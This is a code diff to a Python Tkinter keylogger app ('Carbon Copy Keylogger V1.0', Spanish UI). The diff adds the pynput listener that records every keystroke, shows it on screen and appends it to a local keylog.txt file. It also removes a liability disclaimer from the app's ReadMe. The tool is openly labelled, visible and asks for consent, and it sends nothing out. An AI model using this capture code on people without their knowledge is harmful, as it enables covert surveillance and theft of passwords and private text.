@@ -3,7 +3,6 @@ from tkinter import messagebox, scrolledtext, filedialog, ttk
 from pynput import keyboard
 import threading
 import os
-import sys
 
 class KeyloggerApp:
     def __init__(self, root):
@@ -13,20 +12,14 @@ class KeyloggerApp:
         self.root.resizable(False, False)
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
 
-        self.is_logging = False
-        self.log = ""
-        self.log_file = None
-
-        self.create_widgets()
-
         # Variables
-        self.logging = False
+        self.is_logging = False
         self.log_content = ""
         self.listener = None
         self.log_file_path = None
 
-        # Interfaz Gráfica
-        self.create_interface()
+        # Interfaz gráfica
+        self.create_widgets()
 
         # Mostrar acuerdo de licencia
         self.show_license_popup()
@@ -49,13 +42,16 @@ class KeyloggerApp:
         self.stop_button = tk.Button(self.keylogger_tab, text="Detener logs", command=self.stop_logging)
         self.stop_button.pack(side=tk.RIGHT, padx=20)
 
+        # Botón para limpiar logs
+        self.clear_button = tk.Button(self.keylogger_tab, text="Limpiar logs", command=self.clear_logs)
+        self.clear_button.pack(side=tk.BOTTOM, pady=10)
+
         # Pestaña ReadMe
         self.readme_tab = ttk.Frame(self.notebook)
         self.notebook.add(self.readme_tab, text='ReadMe')
 
         # Contenido de la pestaña ReadMe
         readme_text = (
-
             "Carbon Copy Keylogger V1.0\n\n"
             "Este programa fue creado con fines educativos y de investigación.\n"
             "Debe ser utilizado de manera ética y responsable, con el consentimiento explícito de todas las partes involucradas. \n\n"
@@ -65,8 +61,7 @@ class KeyloggerApp:
             "- Guardado de logs en un archivo\n"
             "- Interfaz gráfica con pestañas\n\n"
             "IMPORTANTE: El uso indebido de este software puede tener consecuencias legales. \n"
-            "El programador no se hace responsable de los daños causados por el mal uso de este software.\n"
-            "Creado por @PuercoBomba|2024 \n"
+            "Creado por @PuercoBomba | 2024 \n"
         )
         self.readme_display = scrolledtext.ScrolledText(self.readme_tab, width=60, height=20, state='normal')
         self.readme_display.insert(tk.END, readme_text)
@@ -103,9 +98,48 @@ class KeyloggerApp:
         directory = filedialog.askdirectory(title="Seleccionar carpeta para guardar el archivo de Logs")
         if directory:
             self.log_file_path = os.path.join(directory, "keylog.txt")
+        else:
+            messagebox.showwarning("Advertencia", "No seleccionaste un directorio. Los logs no se guardarán.")
+
+    def start_logging(self):
+        if not self.is_logging:
+            self.is_logging = True
+            self.listener_thread = threading.Thread(target=self.run_keylogger, daemon=True)
+            self.listener_thread.start()
+
+    def stop_logging(self):
+        if self.is_logging:
+            self.is_logging = False
+            if self.listener:
+                self.listener.stop()
+
+    def run_keylogger(self):
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.start()
+        self.listener.join()
+
+    def on_key_press(self, key):
+        try:
+            self.log_content += f"{key.char}"
+        except AttributeError:
+            self.log_content += f"[{key}]"
+
+        # Actualiza el área de texto en la interfaz
+        self.log_display.insert(tk.END, f"{key}\n")
+        self.log_display.see(tk.END)
+
+        # Guarda en el archivo de logs, si está configurado
+        if self.log_file_path:
+            with open(self.log_file_path, "a") as log_file:
+                log_file.write(f"{key}\n")
+
+    def clear_logs(self):
+        self.log_content = ""
+        self.log_display.delete('1.0', tk.END)
 
     def on_closing(self):
-        # Lógica para manejar el cierre de la ventana
+        if self.is_logging and self.listener:
+            self.listener.stop()
         self.root.destroy()
 
 if __name__ == "__main__":
